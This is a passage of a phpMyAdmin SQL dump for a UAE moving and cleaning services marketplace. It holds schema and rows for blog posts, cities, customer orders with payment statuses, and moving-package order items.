-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jun 25, 2024 at 11:10 AM
-- Server version: 5.7.23-23
-- PHP Version: 8.1.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `vendosap_vendorscity`
--

-- --------------------------------------------------------

--
-- Table structure for table `blogs`
--

CREATE TABLE `blogs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `blog_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` date DEFAULT NULL,
  `short_description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci,
  `service` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subservice` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `metatitle` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `metadescription` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `blogs`
--

INSERT INTO `blogs` (`id`, `title`, `blog_url`, `date`, `short_description`, `description`, `service`, `subservice`, `metatitle`, `metadescription`, `image`, `created_at`, `updated_at`) VALUES
(2, 'Blog 1', 'blog-1', '2024-03-14', '<p><strong>Lorem Ipsum</strong> is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type spec', '<p><strong>Lorem Ipsum</strong> is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', '34', '51', NULL, NULL, '1716550166blog2.jpg', '2024-03-13 12:03:49', '2024-03-13 12:03:49'),
(3, 'Blog 2', 'blog-2', '2024-03-14', '<p><strong>Lorem Ipsum</strong> is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type spec', '<p><strong>Lorem Ipsum</strong> is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\'s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', '30', '69', NULL, NULL, '1716550746blog1.jpg', '2024-03-13 12:55:49', '2024-03-13 12:55:49');

-- --------------------------------------------------------

--
-- Table structure for table `blog_category`
--

CREATE TABLE `blog_category` (
  `id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `page_url` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `cities`
--

CREATE TABLE `cities` (
  `id` int(11) NOT NULL,
  `country` int(11) NOT NULL,
  `state` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `cities`
--

INSERT INTO `cities` (`id`, `country`, `state`, `name`, `created_at`, `updated_at`) VALUES
(17, 22, 23, 'Dubai', '2024-02-15 10:50:44', '2024-02-15 10:50:44'),
(20, 22, 25, 'Abu Dhabi', '2024-03-05 09:56:50', '2024-03-05 09:56:50'),
(22, 22, 26, 'Sharjah', '2024-05-29 12:10:47', '2024-05-29 12:10:47'),
(23, 22, 27, 'Ajman', '2024-05-29 12:11:05', '2024-05-29 12:11:05'),
(24, 22, 28, 'Umm Al Quwain', '2024-05-29 12:11:20', '2024-05-29 12:11:20'),
(25, 22, 29, 'Ras Al Khaimah', '2024-05-29 12:11:33', '2024-05-29 12:11:33'),
(26, 22, 30, 'Fujairah', '2024-05-29 12:11:50', '2024-05-29 12:11:50');

-- --------------------------------------------------------

--
-- Table structure for table `ci_orders`
--

CREATE TABLE `ci_orders` (
  `order_id` bigint(20) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `order_number` varchar(255) DEFAULT NULL,
  `order_total` int(11) DEFAULT NULL,
  `shippingcost` int(11) DEFAULT NULL,
  `vatcharge` int(11) DEFAULT NULL,
  `order_currency` varchar(255) DEFAULT NULL,
  `order_status` varchar(255) DEFAULT NULL,
  `paymentmode` varchar(255) DEFAULT NULL,
  `payment_status` varchar(255) DEFAULT NULL,
  `payment_id` varchar(255) DEFAULT NULL,
  `currency` varchar(255) DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `coupondiscount` int(11) DEFAULT NULL,
  `coupon_code` varchar(255) DEFAULT NULL,
  `list_order_status` int(11) DEFAULT NULL,
  `vendor_id` int(11) DEFAULT '0',
  `service_charge` varchar(255) DEFAULT NULL,
  `additional_charge` varchar(255) DEFAULT NULL,
  `sub_total` varchar(255) DEFAULT NULL,
  `cod_charge` varchar(255) DEFAULT NULL,
  `service_fee` varchar(255) DEFAULT NULL,
  `order_from` int(11) DEFAULT '0' COMMENT '(0=package,1=booking form data)'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `ci_orders`
--

INSERT INTO `ci_orders` (`order_id`, `user_id`, `order_number`, `order_total`, `shippingcost`, `vatcharge`, `order_currency`, `order_status`, `paymentmode`, `payment_status`, `payment_id`, `currency`, `created_at`, `coupondiscount`, `coupon_code`, `list_order_status`, `vendor_id`, `service_charge`, `additional_charge`, `sub_total`, `cod_charge`, `service_fee`, `order_from`) VALUES
(1, 5, '1', 1764, 0, 84, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-01 09:20:07', 0, '', 0, 48, NULL, NULL, NULL, NULL, NULL, 0),
(2, 12, '2', 2470, 0, 118, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-05 05:40:46', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(3, 12, '3', 882, 0, 42, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-05 05:43:52', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(4, 13, '4', 1231, 0, 59, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-01-09 12:26:12', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(5, 5, '5', 158, 0, 8, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-10 13:39:39', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(6, 5, '6', 1231, 0, 59, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-10 13:42:41', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(7, 5, '7', 2470, 0, 118, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-10 13:44:32', 0, '', 0, 70, NULL, NULL, NULL, NULL, NULL, 0),
(8, 5, '8', 1575, 0, 75, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-17 04:34:06', 0, '', 0, 71, NULL, NULL, NULL, NULL, NULL, 0),
(9, 17, '9', 134, 0, 6, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-26 09:40:16', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(10, 18, '10', 134, 0, 6, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-01-26 09:45:17', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(11, 18, '11', 134, 0, 6, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-01-29 12:18:25', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(12, 18, '12', 134, 0, 6, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-01-29 12:22:36', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(13, 18, '13', 134, 0, 6, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-01-29 12:23:25', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(14, 18, '14', 134, 0, 6, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-01-29 12:27:25', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(15, 16, '15', 992, 0, 47, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-26 06:39:49', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(16, 20, '16', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-27 13:37:11', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(17, 21, '17', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-28 06:48:05', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(18, 19, '18', 7623, 0, 363, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-29 05:35:18', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(19, 19, '19', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-29 05:48:36', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(20, 19, '20', 2541, 0, 121, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-29 06:54:17', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(21, 19, '21', 1544, 0, 74, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-29 06:55:34', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(22, 19, '22', 2315, 0, 110, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-02-29 11:18:25', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(23, 19, '23', 1985, 0, 95, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-02-29 11:23:24', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(24, 19, '24', 10364, 0, 494, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-03-01 12:21:06', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(25, 19, '25', 2541, 0, 121, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-28 11:39:13', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(26, 19, '26', 3644, 0, 174, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 10:42:45', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(27, 19, '27', 3644, 0, 174, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 10:59:28', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(28, 19, '28', 3644, 0, 174, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 11:10:19', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(29, 19, '29', 3644, 0, 174, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 11:10:47', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(30, 19, '30', 3644, 0, 174, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 11:12:18', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(31, 19, '31', 129, 0, 6, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 11:30:50', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(32, 19, '32', 129, 0, 6, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 11:38:31', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(33, 19, '33', 129, 0, 6, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-29 11:42:32', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(34, 19, '34', 2541, 0, 121, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-30 03:31:54', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(35, 19, '35', 2541, 0, 121, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-30 03:33:30', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(36, 19, '36', 2541, 0, 121, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-03-30 03:34:21', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(37, 19, '37', 2541, 0, 121, 'AED', 'P', '2', 'Success', 'cs_test_a1WDmgPVV0C6JV7gaqXK286qZwQlkIwkO4jYN7LwjKGFpGBm73t6IeGzRd', 'aed', '2024-03-30 03:36:18', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(38, 19, '38', 6841, 0, 326, 'AED', 'P', '2', 'Success', 'cs_test_a1zZH3xbA9Qmbc0TvIGkqjBOT0B1Bcxw2Vp1iaKJY2qPKiQCdZiz4oZMNm', 'aed', '2024-03-30 04:17:23', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(39, 19, '39', 772, 0, 37, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-09 05:35:29', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(40, 19, '40', 1, 0, 0, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-09 05:42:14', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(41, 19, '41', 1, 0, 0, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-09 05:42:51', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(42, 19, '42', 773, 0, 37, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-09 05:43:27', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(43, 19, '43', 11, 0, 1, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-09 06:02:52', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(44, 19, '44', 3302, 0, 157, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-16 07:44:30', 0, '', 0, 73, NULL, NULL, NULL, NULL, NULL, 0),
(45, 25, '45', 3197, 0, 152, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-16 07:51:00', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(46, 10, '46', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-18 06:22:11', 0, '', 0, 75, NULL, NULL, NULL, NULL, NULL, 0),
(47, 10, '47', 992, 0, 47, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-18 06:22:53', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(48, 19, '48', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-18 10:18:52', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(49, 19, '49', 882, 0, 42, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-18 10:20:28', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(50, 19, '50', 992, 0, 47, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-18 10:26:34', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(51, 19, '51', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-18 10:34:42', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(52, 10, '52', 1874, 0, 89, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-18 11:26:54', 0, '', 0, 79, NULL, NULL, NULL, NULL, NULL, 0),
(53, 19, '53', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-20 06:34:28', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(54, 19, '54', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-20 06:35:22', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(55, 6, '55', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-21 08:46:31', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(56, 6, '56', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-22 04:58:30', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(57, 16, '57', 772, 0, 37, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-23 07:56:01', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(58, 19, '58', 772, 0, 37, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-23 10:44:09', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(59, 16, '59', 1, 0, 0, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-05-24 06:56:22', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(60, 16, '60', 2, 0, 0, 'AED', 'P', '2', 'Success', 'cs_live_a1mLYEKYTeiMUuQTZXWSskKhaOUBugywJKKVRxTA4NnnL9d4aEZDOoU2BC', 'aed', '2024-05-24 06:57:02', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(61, 19, '61', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-28 11:18:52', 0, '', 0, 75, NULL, NULL, NULL, NULL, NULL, 0),
(62, 19, '62', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-28 11:20:49', 0, '', 0, 73, NULL, NULL, NULL, NULL, NULL, 0),
(63, 31, '63', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-29 12:46:37', 0, '', 0, 73, NULL, NULL, NULL, NULL, NULL, 0),
(64, 16, '64', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-29 20:31:20', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(65, 32, '65', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-30 05:55:10', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(66, 32, '66', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-30 07:18:36', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(67, 32, '67', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-05-30 07:18:39', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(68, 33, '68', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-01 09:00:54', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(69, 19, '69', 882, 0, 42, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-01 09:02:59', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(70, 33, '70', 2541, 0, 121, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-01 09:09:45', 0, '', 0, 77, NULL, NULL, NULL, NULL, NULL, 0),
(71, 32, '71', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-01 12:59:04', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(72, 32, '72', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-01 12:59:09', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(73, 33, '73', 1544, 0, 74, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-07 08:36:33', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(74, 19, '74', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-08 06:10:09', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(75, 19, '75', 118, NULL, 6, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-10 12:10:56', NULL, NULL, 0, 0, '78', '20', '112', '5', '9', 1),
(76, 19, '76', 118, NULL, 6, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-10 12:12:21', NULL, NULL, 0, 0, '78', '20', '112', '5', '9', 1),
(77, 19, '77', 97, NULL, 5, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-10 12:14:45', NULL, NULL, 0, 0, '78', '0', '92', '5', '9', 1),
(78, 19, '78', 91, NULL, 4, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-06-10 12:18:20', NULL, NULL, 0, 0, '78', '0', '87', '0', '9', 1),
(79, 19, '79', 235, NULL, 11, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-10 12:26:50', NULL, NULL, 0, 0, '210', '0', '224', '5', '9', 1),
(80, 19, '80', 97, NULL, 5, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-10 13:00:11', NULL, NULL, 0, 0, '78', '0', '92', '5', '9', 1),
(81, 19, '81', 298, NULL, 14, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-10 13:26:05', NULL, NULL, 0, 0, '210', '60', '284', '5', '9', 1),
(82, 19, '82', 118, NULL, 6, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-11 04:35:44', NULL, NULL, 0, 0, '78', '20', '112', '5', '9', 1),
(83, 19, '83', 298, NULL, 14, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-11 06:12:29', NULL, NULL, 0, 0, '210', '60', '284', '5', '9', 1),
(84, 35, '84', 6841, 0, 326, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-11 15:47:22', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(85, 35, '85', 6841, 0, 326, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-11 15:47:28', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(86, 35, '86', 6841, 0, 326, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-11 15:47:34', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(87, 35, '87', 6841, 0, 326, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-11 15:47:38', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(88, 19, '88', 298, NULL, 14, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-14 06:42:18', NULL, NULL, 0, 0, '210', '60', '284', '5', '9', 1),
(89, 19, '89', 1693, NULL, 81, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-14 06:43:01', NULL, NULL, 0, 0, '1598', '0', '1612', '5', '9', 1),
(90, 16, '90', 156, NULL, 7, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-14 18:41:10', NULL, NULL, 0, 0, '105', '30', '149', '5', '9', 1),
(91, 36, '91', 156, NULL, 7, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-15 12:51:01', NULL, NULL, 0, 0, '105', '30', '149', '5', '9', 1),
(92, 37, '92', 772, 0, 37, 'AED', 'P', '2', 'FAILED', NULL, NULL, '2024-06-16 10:02:57', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(93, 19, '93', 772, 0, 37, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-18 12:02:55', 0, '', 0, 0, NULL, NULL, NULL, NULL, NULL, 0),
(94, 19, '94', 329, NULL, 16, 'AED', 'P', '1', 'Success', NULL, NULL, '2024-06-18 13:49:50', NULL, NULL, 0, 0, '299', '0', '313', '5', '9', 1);

-- --------------------------------------------------------

--
-- Table structure for table `ci_order_item`
--

CREATE TABLE `ci_order_item` (
  `id` bigint(20) NOT NULL,
  `order_id` int(11) DEFAULT NULL,
  `user_info_id` int(11) DEFAULT NULL,
  `package_id` int(11) DEFAULT NULL,
  `package_item_name` varchar(255) DEFAULT NULL,
  `package_quantity` int(11) DEFAULT NULL,
  `package_item_price` bigint(20) DEFAULT NULL,
  `service_id` int(11) DEFAULT NULL,
  `service_name` varchar(255) DEFAULT NULL,
  `subservice_id` int(11) DEFAULT NULL,
  `subservice_name` varchar(255) DEFAULT NULL,
  `packagecategory_id` int(11) DEFAULT NULL,
  `packagecategory_name` varchar(255) DEFAULT NULL,
  `page_url` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `discount` int(11) DEFAULT NULL,
  `discount_type` int(11) DEFAULT NULL,
  `cdate` date DEFAULT NULL,
  `product_discount_amount` int(11) NOT NULL,
  `subservice_booking_percentage` int(11) NOT NULL,
  `is_return` int(11) NOT NULL DEFAULT '0',
  `how_many_cleaners_do_you_need` varchar(255) DEFAULT NULL,
  `how_many_hours_should_they_stay` varchar(255) DEFAULT NULL,
  `how_often_do_you_need_cleaning` varchar(255) DEFAULT NULL,
  `do_you_need_cleaning_material` varchar(255) DEFAULT NULL,
  `any_special_instruction` varchar(255) DEFAULT NULL,
  `address_type` varchar(255) DEFAULT NULL,
  `city` varchar(255) DEFAULT NULL,
  `area` varchar(255) DEFAULT NULL,
  `building_street_no` varchar(255) DEFAULT NULL,
  `apartment_villa_no` varchar(255) DEFAULT NULL,
  `bookingdate` varchar(255) DEFAULT NULL,
  `month` varchar(255) DEFAULT NULL,
  `bookingyear` varchar(255) DEFAULT NULL,
  `time_slot` varchar(255) DEFAULT NULL,
  `which_day_of_the_week_do_you_want_the_service` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `ci_order_item`
--

INSERT INTO `ci_order_item` (`id`, `order_id`, `user_info_id`, `package_id`, `package_item_name`, `package_quantity`, `package_item_price`, `service_id`, `service_name`, `subservice_id`, `subservice_name`, `packagecategory_id`, `packagecategory_name`, `page_url`, `image`, `discount`, `discount_type`, `cdate`, `product_discount_amount`, `subservice_booking_percentage`, `is_return`, `how_many_cleaners_do_you_need`, `how_many_hours_should_they_stay`, `how_often_do_you_need_cleaning`, `do_you_need_cleaning_material`, `any_special_instruction`, `address_type`, `city`, `area`, `building_street_no`, `apartment_villa_no`, `bookingdate`, `month`, `bookingyear`, `time_slot`, `which_day_of_the_week_do_you_want_the_service`) VALUES
(1, 1, 5, 11, 'Studio Apartment Standard Move', 2, 840, 16, 'Moving Packages', 18, 'APARTMENT MOVING SERVICES DUBAI, UAE', 16, 'Apartment', 'studio-apartment-standard-move', '1702011321Packaging-Detail-page-slider-2.jpg', NULL, 2, '2024-01-01', 0, 10, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(2, 2, 12, 6, '3 BR Villa Standard Move', 1, 2940, 16, 'Moving Packages', 17, 'Villa Movers and Packers', 16, 'Villa', '3-br-villa-standard-move', '1702010306Packaging-Detail-page-slider-4.jpg', 20, 0, '2024-01-05', 2352, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(3, 3, 12, 11, 'Studio Apartment Standard Move', 1, 840, 16, 'Moving Packages', 18, 'Apartment Moving Services Dubai, UAE', 16, 'Apartment', 'studio-apartment-standard-move', '1702011321Packaging-Detail-page-slider-2.jpg', NULL, 2, '2024-01-05', 0, 10, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(4, 4, 13, 12, 'Movers', 1, 1234, 16, 'Moving Packages', 17, 'Villa Movers and Packers', 16, 'Villa', 'movers', '17044528821699017002111.jpg', 5, 0, '2024-01-09', 1172, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(5, 5, 5, 13, 'test package', 1, 150, 21, 'Moving Packages', 19, 'Booking charge services test', 21, 'Test', 'test-package', '1704893856no-image-new.png', NULL, 2, '2024-01-10', 0, 10, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(6, 6, 5, 12, 'Movers', 1, 1234, 16, 'Moving Packages', 17, 'Villa Movers and Packers', 16, 'Villa', 'movers', '17044528821699017002111.jpg', 5, 0, '2024-01-10', 1172, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(7, 7, 5, 6, '3 BR Villa Standard Move', 1, 2940, 16, 'Moving Packages', 17, 'Villa Movers and Packers', 16, 'Villa', '3-br-villa-standard-move', '1702010306Packaging-Detail-page-slider-4.jpg', 20, 0, '2024-01-10', 2352, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
